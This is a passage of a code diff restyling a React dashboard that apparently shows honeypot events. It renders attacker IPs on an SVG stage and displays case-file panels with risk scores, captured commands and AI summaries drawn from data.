+                  <line x1="10" y1="20" x2="170" y2="20" stroke="#eae5db" strokeWidth="2" strokeDasharray="2 4" />
+                  <line x1={`${10 + (focusLevel * 1.6)}`} y1="4" x2={`${10 + (focusLevel * 1.6)}`} y2="36" stroke="#1c1c1f" strokeWidth="3" />
+                  <g transform={`translate(${10 + (focusLevel * 1.6) - 10}, 8)`}>
+                    <rect x="3" y="0" width="14" height="24" fill="#ff6b00" rx="3" stroke="#1c1c1f" strokeWidth="2" />
+                    <line x1="10" y1="4" x2="10" y2="20" stroke="#ffffff" strokeWidth="2" />
+                    <circle cx="10" cy="12" r="3" fill="#1c1c1f" />
+                  </g>
+                </svg>
+              </div>
+              <p className="text-[10px] text-slate-500 italic">Alters spotlight coverage threshold footprint filters.</p>
+            </div>
+
+          </div>
+
+          {/* REALTIME SYSTEM TELEMETRY LOGGER */}
+          <div className="flex-1 comic-border bg-[#faf6f0] p-4 flex flex-col gap-2 overflow-hidden relative">
+            <h3 className="text-sm font-black tracking-widest border-b-2 border-[#1c1c1f] pb-2 uppercase">
+              THEATER SCRIPT EVENTS
+            </h3>
+            <div className="flex-1 overflow-y-auto font-mono text-[11px] leading-relaxed flex flex-col gap-1 pr-1 text-[#1c1c1f]/80">
+              {threatLogs.map((log, i) => (
+                <div key={i} className="border-b border-[#1c1c1f]/10 pb-1">
+                  {log}
                 </div>
               ))}
+            </div>
+          </div>
 
-              <div style={{ margin: '14px 0' }}>
-                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', marginBottom: '5px' }}>
-                  <span style={{ color: '#ffffff25', letterSpacing: '1px' }}>THREAT LEVEL</span>
-                  <span style={{ color: risk!.color }}>{selected.risk_score}/100</span>
-                </div>
-                <div style={{ height: '4px', background: '#ffffff08', borderRadius: '2px', overflow: 'hidden' }}>
-                  <div style={{ width: `${selected.risk_score}%`, height: '100%', background: risk!.color, borderRadius: '2px', transition: 'width 0.8s ease' }} />
-                </div>
+        </div>
+
+        {/* CENTER COMPANION PANEL: The Theater Floor Grid (Visual Stage) */}
+        <div className="lg:col-span-6 flex flex-col gap-4 overflow-hidden relative">
+
+          <div className="flex-1 comic-border bg-[#faf6f0] flex flex-col p-4 relative overflow-hidden">
+            <div className="absolute inset-0 pointer-events-none opacity-[0.05]" style={{ backgroundImage: 'url(#halftonePattern)' }} />
+
+            <div className="flex justify-between items-center mb-2 pb-2 border-b-2 border-[#1c1c1f] z-10">
+              <span className="text-xs font-black tracking-widest uppercase">STAGE VIEW: LIVE TARGET CAPTURE CODES</span>
+              <span className="text-xs font-black text-[#ff2a5f] animate-pulse">● PREDATOR VIEW LIVE</span>
+            </div>
+
+            {/* STAGE SCREEN (SVG Perspective Grid representation) */}
+            <div className="flex-1 relative border-2 border-[#1c1c1f] bg-[#fdfcfa] flex items-center justify-center overflow-hidden shadow-inner">
+
+              <svg className="absolute inset-0 w-full h-full" viewBox="0 0 600 400" preserveAspectRatio="none">
+
+                {/* 1. Perspective Tiled Grid Floor */}
+                <g stroke="#1c1c1f" strokeWidth="1" strokeOpacity="0.15">
+                  {Array.from({ length: 13 }).map((_, i) => {
+                    const progress = i / 12
+                    const xTop = 150 + progress * 300
+                    const xBottom = -50 + progress * 700
+                    return <line key={i} x1={xTop} y1="40" x2={xBottom} y2="400" />
+                  })}
+                  {Array.from({ length: 10 }).map((_, i) => {
+                    const y = 40 + Math.pow(i / 9, 1.5) * 360
+                    return <line key={i} x1="0" y1={y} x2="600" y2={y} />
+                  })}
+                </g>
+
+                {/* 2. Decoy Core Spotlight Lamp elements */}
+                <rect x="0" y="0" width="600" height="30" fill="#faf6f0" stroke="#1c1c1f" strokeWidth="2" />
+                <line x1="0" y1="30" x2="600" y2="30" stroke="#1c1c1f" strokeWidth="2" />
+                {[100, 250, 400, 500].map((lampX, i) => (
+                  <g key={i} transform={`translate(${lampX}, 18)`}>
+                    <line x1="0" y1="-8" x2="0" y2="12" stroke="#1c1c1f" strokeWidth="2" />
+                    <rect x="-10" y="12" width="20" height="10" rx="2" fill="#1c1c1f" />
+                  </g>
+                ))}
+
+                {/* 3. Render Custom Spotlight Cones */}
+                <polygon
+                  points="250,30 100,400 450,400"
+                  fill="url(#halftoneRed)"
+                  opacity="0.35"
+                />
+
+                {/* ACTIVE HIGH-INTENSITY CONE pointing directly at the selected intruder */}
+                {selected && (
+                  <g>
+                    <polygon
+                      points={`250,30 ${(selected.stageX / 100) * 600 - (focusLevel * 1.5)},${(selected.stageY / 100) * 400 + 40} ${(selected.stageX / 100) * 600 + (focusLevel * 1.5)},${(selected.stageY / 100) * 400 + 40}`}
+                      fill="#ff2a5f"
+                      opacity="0.18"
+                    />
+                    <ellipse
+                      cx={(selected.stageX / 100) * 600}
+                      cy={(selected.stageY / 100) * 400}
+                      rx={focusLevel * 1.1}
+                      ry={focusLevel * 0.4}
+                      fill="none"
+                      stroke="#ff2a5f"
+                      strokeWidth="2.5"
+                      strokeDasharray="4 4"
+                    />
+                  </g>
+                )}
+
+                {/* 4. Render Attacker Shadow Silhouettes wandering the floor */}
+                {events.map((evt) => {
+                  const xCoord = (evt.stageX / 100) * 600
+                  const yCoord = (evt.stageY / 100) * 400
+                  const isSelected = selected?.id === evt.id
+
+                  return (
+                    <g
+                      key={evt.id}
+                      className="cursor-pointer"
+                      onClick={() => setSelected(evt)}>
+
+                      {/* Interactive target bracket borders [ ] */}
+                      {isSelected && (
+                        <g transform={`translate(${xCoord - 35}, ${yCoord - 45})`}>
+                          <path d="M 0 10 L 0 0 L 10 0" stroke="#ff2a5f" strokeWidth="3" fill="none" />
+                          <path d="M 60 0 L 70 0 L 70 10" stroke="#ff2a5f" strokeWidth="3" fill="none" />
+                          <path d="M 0 45 L 0 55 L 10 55" stroke="#ff2a5f" strokeWidth="3" fill="none" />
+                          <path d="M 60 55 L 70 55 L 70 45" stroke="#ff2a5f" strokeWidth="3" fill="none" />
+                        </g>
+                      )}
+
+                      {/* Attacker Shadow Silhouette vector path */}
+                      <g transform={`translate(${xCoord - 18}, ${yCoord - 36}) scale(0.4)`}>
+                        <path
+                          d={SHADOW_SILHOUETTES[evt.silhouetteType]}
+                          fill={isSelected ? '#ff2a5f' : '#1c1c1f'}
+                          stroke={isSelected ? '#ffffff' : 'none'}
+                          strokeWidth="2"
+                        />
+                      </g>
+
+                      {/* Small Indicator dot under foot */}
+                      <ellipse
+                        cx={xCoord}
+                        cy={yCoord}
+                        rx="12"
+                        ry="4"
+                        fill={isSelected ? '#ff2a5f' : '#1c1c1f'}
+                        opacity="0.3"
+                      />
+
+                      {/* Quick IP text above */}
+                      <text
+                        x={xCoord}
+                        y={yCoord - 42}
+                        fontFamily="monospace"
+                        fontSize="10"
+                        fontWeight="bold"
+                        fill={isSelected ? '#ff2a5f' : '#1c1c1f'}
+                        textAnchor="middle">
+                        {evt.ip}
+                      </text>
+                    </g>
+                  )
+                })}
+
+                {/* 5. Comic Bubble for selected IP */}
+                {selected && (
+                  <g transform={`translate(${(selected.stageX / 100) * 600 - 90}, ${(selected.stageY / 100) * 400 - 95})`}>
+                    <path
+                      d="M 5 5 L 175 5 L 175 40 L 100 40 L 90 55 L 85 40 L 5 40 Z"
+                      fill="#faf6f0"
+                      stroke="#1c1c1f"
+                      strokeWidth="2.5"
+                    />
+                    <text x="90" y="20" fontSize="9" fontWeight="900" fill="#1c1c1f" textAnchor="middle">
+                      PAYLOAD CAPTURED
+                    </text>
+                    <text x="90" y="32" fontSize="9" fontWeight="900" fill="#ff2a5f" textAnchor="middle">
+                      {selected.event_type.replace(/_/g, ' ').toUpperCase()}
+                    </text>
+                  </g>
+                )}
+
+              </svg>
+
+              <div className="absolute bottom-2 left-2 px-2 py-1 bg-[#1c1c1f] text-[#faf6f0] text-[9px] font-bold uppercase transform -rotate-1">
+                Trigger spotlight: click a shadow silhouette
               </div>
 
-              {selected.commands?.length > 0 && (
-                <div style={{ marginTop: '12px' }}>
-                  <div style={{ fontSize: '9px', color: '#ffffff20', letterSpacing: '2px', marginBottom: '6px' }}>INTERCEPTED</div>
-                  {selected.commands.map((c, i) => (
-                    <div key={i} style={{ fontSize: '11px', color: '#4ade80', marginBottom: '3px' }}>$ {c}</div>
+            </div>
+
+            {/* COMIC ACTION TABS BAR */}
+            <div className="grid grid-cols-3 gap-2 mt-4 z-10">
+              {[
+                { id: 'DECOYS', label: 'DEPLOY NEW SPOTS' },
+                { id: 'SCRIPTS', label: 'ANALYZE SCRIPTS' },
+                { id: 'TRAPS', label: 'CONTAINMENT TRAPS' }
+              ].map((tab) => (
+                <button
+                  key={tab.id}
+                  onClick={() => setActiveTab(tab.id as any)}
+                  className="px-2 py-3 border-4 border-[#1c1c1f] font-black text-[11px] uppercase tracking-wider text-center cursor-pointer transition-all active:translate-y-1"
+                  style={{
+                    backgroundColor: activeTab === tab.id ? '#ff2a5f' : '#faf6f0',
+                    color: activeTab === tab.id ? '#ffffff' : '#1c1c1f',
+                    boxShadow: activeTab === tab.id ? '0px 0px 0px' : '4px 4px 0px #1c1c1f'
+                  }}>
+                  {tab.label}
+                </button>
+              ))}
+            </div>
+
+          </div>
+
+        </div>
+
+        {/* RIGHT COMPANION PANEL: The Redacted Dossier file */}
+        <div className="lg:col-span-3 flex flex-col overflow-hidden">
+
+          <div className="flex-1 comic-border bg-[#faf6f0] p-4 flex flex-col gap-4 overflow-y-auto relative">
+            <div className="absolute inset-0 opacity-5" style={{ backgroundImage: 'url(#halftonePattern)' }} />
+
+            {selected ? (
+              <div className="flex flex-col gap-4 z-10">
+
+                {/* Dossier Header */}
+                <div className="border-b-4 border-double border-[#1c1c1f] pb-3 relative">
+                  <span className="text-[10px] font-black tracking-widest text-[#1c1c1f]/50 uppercase">
+                    CLASSIFIED FILE NO: ST-{selected.id.substring(0, 5).toUpperCase()}
+                  </span>
+                  <h2 className="text-2xl font-black tracking-tight text-[#1c1c1f] break-all leading-none mt-1">
+                    {selected.ip}
+                  </h2>
+                  <div className="text-xs font-bold text-[#ff2a5f] mt-1">
+                    {selected.city.toUpperCase()} // {selected.country.toUpperCase()}
+                  </div>
+
+                  {/* Stamp Graphic Warning Overlay */}
+                  <div className="absolute top-0 right-0 transform rotate-12 scale-90">
+                    {selected.risk_score >= 60 ? (
+                      <div className="stamp-red border-4 border-dashed border-[#ff2a5f] text-[#ff2a5f] px-2 py-1 font-black text-[10px] uppercase bg-[#faf6f0]/90">
+                        HIGH HAZARD
+                      </div>
+                    ) : (
+                      <div className="stamp-gold border-4 border-dashed border-[#facc15] text-[#facc15] px-2 py-1 font-black text-[10px] uppercase bg-[#faf6f0]/90">
+                        TRAPPED STAGE
+                      </div>
+                    )}
+                  </div>
+                </div>
+
+                {/* Grid readouts */}
+                <div className="flex flex-col gap-2">
+                  {[
+                    ['NETWORK ENTRY', selected.honeypot_type],
+                    ['SIGNATURE DETECTED', selected.event_type.replace(/_/g, ' ')],
+                    ['INTERNET PROVIDER', selected.isp],
+                    ['RISK LEVEL', `LVL ${getRisk(selected.risk_score).level} (${selected.risk_score}%)`]
+                  ].map(([key, val]) => (
+                    <div key={key} className="p-2 border-2 border-[#1c1c1f] bg-[#fcf9f2] rounded">
+                      <div className="text-[9px] font-black text-slate-500 uppercase">{key}</div>
+                      <div className="text-[11px] font-bold text-[#1c1c1f] uppercase">{val}</div>
+                    </div>
                   ))}
                 </div>
-              )}
 
-              {selected.ai_summary && (
-                <div style={{ marginTop: '14px', padding: '10px', border: '0.5px solid #ffffff08', borderRadius: '6px' }}>
-                  <div style={{ fontSize: '9px', color: '#ffffff20', letterSpacing: '2px', marginBottom: '6px' }}>AI ANALYSIS</div>
-                  <div style={{ fontSize: '11px', color: '#ffffff40', lineHeight: 1.8, whiteSpace: 'pre-line' }}>{selected.ai_summary}</div>
+                {/* Threat score progress bar */}
+                <div className="p-3 border-2 border-[#1c1c1f] bg-[#fcf9f2] rounded">
+                  <div className="flex justify-between text-[10px] font-black mb-1">
+                    <span>DELUSION COEFFICIENT</span>
+                    <span className="text-[#ff2a5f]">{selected.risk_score}% CAPTURED</span>
+                  </div>
+                  <div className="h-4 bg-[#eae5db] border-2 border-[#1c1c1f] overflow-hidden rounded relative">
+                    <div
+                      className="h-full bg-[#ff2a5f] transition-all duration-1000"
+                      style={{
+                        width: `${selected.risk_score}%`,
+                        backgroundImage: 'url(#halftoneRed)'
+                      }}
+                    />
+                  </div>
                 </div>
-              )}
-            </div>
-          )}
+
+                {/* Keystrokes Log */}
+                <div className="p-3 border-2 border-[#1c1c1f] bg-[#1c1c1f] text-[#00ff88] rounded">
+                  <div className="text-[9px] font-black text-[#faf6f0] tracking-wider mb-2 border-b border-[#faf6f0]/20 pb-1">
+                    CAPTURED SHELL TELEMETRY
+                  </div>
+                  {selected.commands && selected.commands.length > 0 ? (
+                    <div className="flex flex-col gap-1 font-mono text-[10px]">
+                      {selected.commands.map((cmd, i) => (
+                        <div key={i} className="break-all">
+                          $ <span className="text-white">{cmd}</span>
+                        </div>
+                      ))}
+                    </div>
+                  ) : (
+                    <div className="text-[10px] italic text-[#faf6f0]/50 text-center py-2">
+                      Passive scouting detected. Mirror system active.
+                    </div>
+                  )}
+                </div>
+
+                {/* AI Summary report styled with Redacted boxes */}
+                {selected.ai_summary && (
+                  <div className="p-3 border-2 border-dashed border-[#1c1c1f] bg-[#faf6f0] relative">
+                    <div className="text-[9px] font-black text-slate-500 uppercase mb-1">TACTICAL INTERPRETATION REPORT</div>
+                    <p className="text-[11px] leading-relaxed font-mono text-slate-700">
+                      {selected.ai_summary}
+                    </p>
+                  </div>
+                )}
+
+              </div>
+            ) : (
+              <div className="h-full flex items-center justify-center text-center p-6 text-slate-400 italic text-xs">
+                Select an intruder on the theater floor to open tactical case file dossier.
+              </div>
+            )}
+
+          </div>
+
         </div>
+
       </div>
-    </>
+
+    </div>
   )
 }
